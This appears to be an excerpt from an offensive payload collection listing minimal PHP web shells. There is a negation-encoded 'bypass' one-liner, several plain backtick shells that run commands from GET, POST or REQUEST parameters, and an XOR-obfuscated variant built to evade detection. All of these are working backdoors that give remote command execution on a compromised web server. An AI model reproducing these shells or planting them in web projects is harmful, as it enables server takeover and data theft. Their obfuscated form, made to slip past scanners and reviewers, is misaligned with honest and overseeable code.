PHP - Tiny with bypass:

```php
<?=`{${~"\xa0\xb8\xba\xab"}["\xa0"]}`;
```

PHP - Tiny with obfuscation:

```php
# Unobfuscated

<?=`$_GET[0]`?> 
<?=`$_POST[0]`?> 
<?=`{$_REQUEST['_']}`?>

# Obfuscated

<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
```

